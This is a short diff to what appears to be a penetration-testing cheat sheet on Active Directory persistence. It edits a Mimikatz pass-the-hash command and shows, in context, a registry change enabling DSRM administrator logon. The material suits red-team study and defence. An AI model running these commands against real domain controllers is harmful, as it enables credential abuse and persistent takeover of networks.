@@ -76,7 +76,7 @@ C:> Enter-PSSession -Computername <hostname>
 C:> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
 
 # 5. Pass the hash. FQDS domain and NTLM Hash obtained for Administrator in step 1.
-C:> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<domain> /user:Administrator /ntlm:<adim_hash> /run:powershell.exe
+C:> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<domain-dc_host> /user:Administrator /ntlm:<adim_hash> /run:powershell.exe
 ```
 ### SSP (Security Support Provider)
 ---
